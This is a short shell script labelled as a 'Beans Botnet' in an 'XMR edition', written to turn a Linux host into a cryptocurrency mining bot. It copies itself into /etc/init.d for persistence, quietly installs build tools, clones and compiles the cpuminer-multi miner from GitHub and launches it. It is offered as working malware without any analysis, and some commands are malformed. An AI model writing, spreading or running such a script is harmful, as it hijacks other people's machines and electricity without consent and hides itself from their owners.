################
#    Beans     # XMR EDITION
#    Botnet    #
###############
filename="$0"
# Persistance Mech
mv $filename /etc/init.d/
chmod +x /etc/init.d/$filename
##################
apt-get update && apt-get upgrade -y >/dev/null/
apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential git nano >/dev/null/
apt-get install autoconf pkg-config libgmp-dev zlib1g-dev make g++ >/dev/null/
git clone --single-branch -b linux https://github.com/tpruvot/cpuminer-multi >/dev/null/
cd cpuminer-multi >/dev/null/
chmod +x build.sh >/dev/null/
chmod +X autogen.sh >/dev/null/
./build.sh || sh build.sh >/dev/null/
cpuminer

